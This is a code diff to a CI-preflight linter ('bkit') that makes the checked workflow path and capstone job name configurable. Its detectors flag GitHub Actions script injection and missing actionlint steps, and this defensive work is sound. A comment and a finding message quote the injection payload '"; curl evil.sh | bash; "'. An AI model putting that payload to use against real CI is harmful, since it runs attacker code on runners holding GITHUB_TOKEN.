@@ -6,6 +6,7 @@ import * as fs from "node:fs";
 import * as path from "node:path";
 import { readJsonFile } from "../../shared/json.js";
 import { readPackageJson } from "../../shared/package-json.js";
+import { ciWorkflowPath, readBkitConfig } from "../../shared/settings.js";
 import type { PreflightFinding } from "../before/index.js";
 import { isAdvisorySuppressed, type SuppressionReporter } from "./suppression.js";
 
@@ -48,24 +49,26 @@ export function detectBkitCloudYmlAlwaysTrueGate(cwd: string): PreflightFinding 
 }
 
 /**
- * Matches a `.github/workflows/bkit-ci.yml` copied from the bkit-ci.yml template: an uncommented
+ * Matches a CI workflow (`bkit.testing.ciWorkflow`) copied from the bkit-ci.yml template: an uncommented
  * job named `bkit-tests` or `bkit-tests-<lane>`, the job names every lane of the template
  * carries.
  */
 const ADOPTED_CI_JOB_RE = /^[ \t]+bkit-tests(?:-[\w-]+)?:[ \t]*$/m;
 
 /**
- * Detect a `.github/workflows/bkit-ci.yml` adopted from bkit's template with no `actionlint` step.
+ * Detect a CI workflow (`bkit.testing.ciWorkflow`, default `bkit-ci.yml`) adopted from bkit's
+ * template with no `actionlint` step.
  * `yaml.safe_load` (and generic YAML linters) accept workflows that are valid YAML
  * but invalid GitHub Actions (doubled quotes inside ${{ }}, always-true `if:` block
  * scalars). actionlint is GHA-aware and catches that class.
  *
  * Only fires when the consumer adopted the bkit-ci.yml template (ADOPTED_CI_JOB_RE).
- * bkit-ci.yml is the consumer's file, so `bkit install` never adds the step — the action
+ * The CI workflow is the consumer's file, so `bkit install` never adds the step — the action
  * inlines the manual step.
  */
 export function detectCiYmlMissingActionlint(cwd: string): PreflightFinding | null {
-  const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
+  const ciRel = ciWorkflowPath(cwd);
+  const ciPath = path.join(cwd, ciRel);
   if (!fs.existsSync(ciPath)) return null;
   const content = fs.readFileSync(ciPath, "utf-8");
   if (!ADOPTED_CI_JOB_RE.test(content)) return null;
@@ -74,9 +77,10 @@ export function detectCiYmlMissingActionlint(cwd: string): PreflightFinding | nu
     id: "ci-yml-missing-actionlint",
     severity: "advisory",
     detect:
-      ".github/workflows/bkit-ci.yml (adopted from bkit's template) has no actionlint step. yaml.safe_load accepts workflows that are valid YAML but invalid GitHub Actions (e.g. doubled quotes inside ${{ }}, an always-true `if:` block scalar); actionlint is GHA-aware and catches them.",
+      `${ciRel} (adopted from bkit's template) has no actionlint step. ` +
+      "yaml.safe_load accepts workflows that are valid YAML but invalid GitHub Actions (e.g. doubled quotes inside ${{ }}, an always-true `if:` block scalar); actionlint is GHA-aware and catches them.",
     action:
-      "Add an actionlint step among the static checks in .github/workflows/bkit-ci.yml (before the test/build group):\n\n" +
+      `Add an actionlint step among the static checks in ${ciRel} (before the test/build group):\n\n` +
       "      - name: Run actionlint\n" +
       "        run: |\n" +
       '          curl -sSfL https://raw.githubusercontent.com/rhysd/actionlint/v1.7.12/scripts/download-actionlint.bash -o "$RUNNER_TEMP/download-actionlint.bash"\n' +
@@ -87,11 +91,11 @@ export function detectCiYmlMissingActionlint(cwd: string): PreflightFinding | nu
 
 /**
  * Detect an untrusted GitHub Actions expression interpolated directly into a `run:` shell
- * body in `.github/workflows/bkit-ci.yml` — the classic GHA script-injection sink. A PR titled
+ * body in the CI workflow (`bkit.testing.ciWorkflow`) — the classic GHA script-injection sink. A PR titled
  * `"; curl evil.sh | bash; "` expands into the runner's shell when `${{ github.event.* }}`
  * (or `github.head_ref`) is inlined into `run:` text. The safe form is env-indirection: map
  * the value to an `env:` var and reference `$VAR` (GitHub runtime-expands env values and never
- * re-parses them as shell). bkit-ci.yml is the consumer's file — bkit's template was hardened but
+ * re-parses them as shell). The CI workflow is the consumer's file — bkit's template was hardened but
  * nothing back-fills a copy adopted before the fix, so it keeps the vulnerable inline form.
  * This surfaces it as a dedicated security finding.
  *
@@ -99,10 +103,11 @@ export function detectCiYmlMissingActionlint(cwd: string): PreflightFinding | nu
  * indentation and flags untrusted expressions inside their bodies only. `env:` / `if:` /
  * `with:` / `concurrency:` contexts are NOT run bodies, so the safe env-indirection form does
  * not fire; a YAML-commented `run:` key never opens a body, so shipped commented stubs stay
- * silent. Only scans a bkit-ci.yml adopted from bkit's template (ADOPTED_CI_JOB_RE).
+ * silent. Only scans a CI workflow adopted from bkit's template (ADOPTED_CI_JOB_RE).
  */
 export function detectCiYmlRunInjection(cwd: string): PreflightFinding | null {
-  const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
+  const ciRel = ciWorkflowPath(cwd);
+  const ciPath = path.join(cwd, ciRel);
   if (!fs.existsSync(ciPath)) return null;
   const content = fs.readFileSync(ciPath, "utf-8");
   if (!ADOPTED_CI_JOB_RE.test(content)) return null;
@@ -151,7 +156,7 @@ export function detectCiYmlRunInjection(cwd: string): PreflightFinding | null {
     id: "ci-yml-run-injection",
     severity: "advisory",
     detect:
-      "SECURITY: .github/workflows/bkit-ci.yml interpolates untrusted GitHub Actions input " +
+      `SECURITY: ${ciRel} interpolates untrusted GitHub Actions input ` +
       "(github.event.* / github.head_ref) directly into a run: shell body — a script-injection " +
       'sink. A PR title or branch name like `"; curl evil.sh | bash; "` then runs on your CI ' +
       `runner (which holds GITHUB_TOKEN):\n${shown}${more}`,
@@ -170,24 +175,28 @@ export function detectCiYmlRunInjection(cwd: string): PreflightFinding | null {
 }
 
 /**
- * Detect drift of the consumer's `bkit-tests-check` capstone from bkit's canonical
- * CI contract. bkit-ci.yml is the consumer's copy of a template; bkit never rewrites it.
+ * Detect drift of the consumer's capstone job (`bkit.testing.ciCapstone`, default
+ * `bkit-tests-check`) from bkit's canonical CI contract. The CI workflow
+ * (`bkit.testing.ciWorkflow`) is the consumer's copy of a template; bkit never rewrites it.
  * WARNING-ONLY presence check: flags the ABSENCE of a known-good fragment, never
- * "differs from canonical". Fires when bkit-ci.yml defines a bkit-tests-check job (the
+ * "differs from canonical". Fires when the CI workflow defines the capstone job (the
  * template ships one).
  *
  * Every check reads `code` (full-line comments stripped): the template's commented
  * scaffold reference names `bkit-tests-check`, `!cancelled()` and `live_ran`.
  */
 export function detectCiYmlCapstoneContractDrift(cwd: string): PreflightFinding | null {
-  const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
+  const ciRel = ciWorkflowPath(cwd);
+  const ciPath = path.join(cwd, ciRel);
   if (!fs.existsSync(ciPath)) return null;
+  const capstone = readBkitConfig(cwd).capstoneJob;
   const content = fs.readFileSync(ciPath, "utf-8");
   const code = content
     .split("\n")
     .filter((line) => !/^\s*#/.test(line))
     .join("\n");
-  if (!/^\s+bkit-tests-check:/m.test(code)) return null; // no capstone job
+  const capstoneJobRe = new RegExp(`^\\s+${capstone.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}:`, "m");
+  if (!capstoneJobRe.test(code)) return null; // no capstone job
 
   const missing: string[] = [];
 
@@ -236,8 +245,8 @@ export function detectCiYmlCapstoneContractDrift(cwd: string): PreflightFinding 
     id: "ci-yml-capstone-contract-drift",
     severity: "advisory",
     detect:
-      `.github/workflows/bkit-ci.yml (adopted from bkit's template) has a bkit-tests-check capstone missing ${missing.length} ` +
-      "load-bearing invariant(s) from bkit's canonical CI contract. bkit-ci.yml is yours to own, so bkit can't rewrite it — this is a heads-up, not a hard failure.",
+      `${ciRel} (adopted from bkit's template) has a ${capstone} capstone missing ${missing.length} ` +
+      `load-bearing invariant(s) from bkit's canonical CI contract. ${ciRel} is yours to own, so bkit can't rewrite it — this is a heads-up, not a hard failure.`,
     action:
       "Consider restoring these to keep `green == validated` (see the FULL CI SCAFFOLD REFERENCE in the bkit bkit-ci.yml template):\n\n" +
       missing.map((m) => "  - " + m).join("\n"),
@@ -377,7 +386,7 @@ function tagUsedInTestTitle(text: string, tag: string, mask: Uint8Array): boolea
  * declares the script); a silent no-op otherwise. WARNING-only; the capstone's
  * `run_live => live_ran > 0` assertion is the runtime check.
  *
- * A package whose own `package.json` opts out (`bkit.ignoreAdvisories`) is dropped from the
+ * A package whose own `package.json` opts out (`bkit.advisories.ignore`) is dropped from the
  * list and reported via `onSuppressed`; sibling packages keep flagging, because the finding
  * aggregates every affected package into one entry.
  */
@@ -469,7 +478,7 @@ export function detectTaggedTestsWithoutCiHome(
       lines.join("\n") +
       '\n\nExample: `"test:live": "vitest run --project live"` (or your runner\'s tag filter). The bkit-tests-check capstone\'s `run_live => live_ran > 0` assertion is the runtime backstop; this catches it earlier.' +
       "\n\nFalse positive? A title that only MENTIONS the tag (a rule linter describing it, a meta/guard test naming the scenario) is indistinguishable from a real tagged test. Opt that package out in its package.json — per-package, and it drops only that package from this list:\n\n" +
-      '    "bkit": { "ignoreAdvisories": ["tagged-tests-no-ci-home"] }',
+      '    "bkit": { "advisories": { "ignore": ["tagged-tests-no-ci-home"] } }',
   };
 }
 
@@ -534,7 +543,7 @@ export function detectTurboIntegrationInputs(cwd: string): PreflightFinding[] {
  * env-agnostic script provisioned at the lane), (3) the vitest integration config the
  * script points at (home of the documented in-file guard).
  *
- * Root-scoped opt-out: this detector reads only the root `package.json`, so a `bkit.ignoreAdvisories`
+ * Root-scoped opt-out: this detector reads only the root `package.json`, so a `bkit.advisories.ignore`
  * entry there drops the finding and reports it via `onSuppressed`.
  */
 export function detectTestIntegrationEnv(
@@ -600,7 +609,7 @@ export function detectTestIntegrationEnv(
       "  - CI lane: set `TEST_REAL_APIS` / export the service-role URL / chain `supabase start` around `turbo run test:integration` in the `.github/workflows/*.yml` job that runs it (keeps local `pnpm test:integration` env-agnostic)\n" +
       "  - vitest integration config: document/enforce the per-file `TEST_REAL_APIS` guard in the config the script `--config`s to.\n\n" +
       "Mocked by design (real-service coverage lives in E2E)? Opt out in the root package.json:\n\n" +
-      '    "bkit": { "ignoreAdvisories": ["test-integration-env-not-asserted"] }',
+      '    "bkit": { "advisories": { "ignore": ["test-integration-env-not-asserted"] } }',
   };
 }
 
@@ -645,11 +654,13 @@ export function detectGhaFloatingTags(cwd: string): PreflightFinding | null {
  * system documented in deployments.md is documentation-only.
  *
  * "Composition" = a `steps.detect.outputs.should_*` READ on an uncommented line, in a
- * sibling workflow or in bkit-ci.yml itself. bkit's shipped steps only SET these outputs and
+ * sibling workflow or in the CI workflow itself. bkit's shipped steps only SET these outputs and
  * the example E2E gate ships commented (`bkit-stub:e2e`), so neither false-positives.
  */
 export function detectRunLevelsNotComposed(cwd: string): PreflightFinding | null {
-  const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
+  const ciWorkflow = readBkitConfig(cwd).ciWorkflow;
+  const ciRel = ciWorkflowPath(cwd);
+  const ciPath = path.join(cwd, ciRel);
   if (!fs.existsSync(ciPath)) return null;
   const ciContent = fs.readFileSync(ciPath, "utf-8");
   // Bkit's bkit-ci.yml ships the `Detect Direct Push` step — if absent, no primitives to compose.
@@ -677,26 +688,25 @@ export function detectRunLevelsNotComposed(cwd: string): PreflightFinding | null
   // Any sibling workflow that gates on the outputs.
   for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
     if (!entry.isFile() || !/\.ya?ml$/.test(entry.name)) continue;
-    if (entry.name === "bkit-ci.yml") continue; // checked below
+    if (entry.name === ciWorkflow) continue; // checked below
     if (composesRunLevels(fs.readFileSync(path.join(workflowsDir, entry.name), "utf-8"))) {
       composed = true;
       break;
     }
   }
-  // Or a consumer-added gate inside bkit-ci.yml itself (e.g. an enabled bkit-stub:e2e block,
+  // Or a consumer-added gate inside the CI workflow itself (e.g. an enabled bkit-stub:e2e block,
   // or a deploy/job step reading the outputs).
   if (!composed && composesRunLevels(ciContent)) composed = true;
   if (composed) return null;
   return {
     id: "run-levels-not-composed",
     severity: "advisory",
-    detect:
-      ".github/workflows/bkit-ci.yml ships bkit's `Detect Direct Push` step outputs (`should_force_build`, `should_run_full`, `cache.outputs.skip`) but no consumer-side workflow or step gates on them.",
+    detect: `${ciRel} ships bkit's \`Detect Direct Push\` step outputs (\`should_force_build\`, \`should_run_full\`, \`cache.outputs.skip\`) but no consumer-side workflow or step gates on them.`,
     action:
       "`docs/deployments.md` documents bkit's none / partial / full run-level shape — the matrix is documentation-only until you compose at least one consumer-side gate. Examples:\n\n" +
       "  - A deploy job: `if: steps.detect.outputs.should_force_build == 'true' || github.ref == 'refs/heads/main'`\n" +
       "  - An E2E job: enable the `bkit-stub:e2e` block (which already gates on `should_run_full`).\n" +
       "  - A smoke workflow: copy the `bkit-stub:smoke` block to `.github/workflows/smoke.yml`.\n\n" +
-      "If your consumer doesn't need run-level tiers (single-track CI, no preview deploys), dismiss by removing the `Detect Direct Push` step from bkit-ci.yml. Note this also disables `[force cache]` / `[force build]` / `[force full]` tag detection.",
+      `If your consumer doesn't need run-level tiers (single-track CI, no preview deploys), dismiss by removing the \`Detect Direct Push\` step from ${ciRel}. Note this also disables \`[force cache]\` / \`[force build]\` / \`[force full]\` tag detection.`,
   };
 }
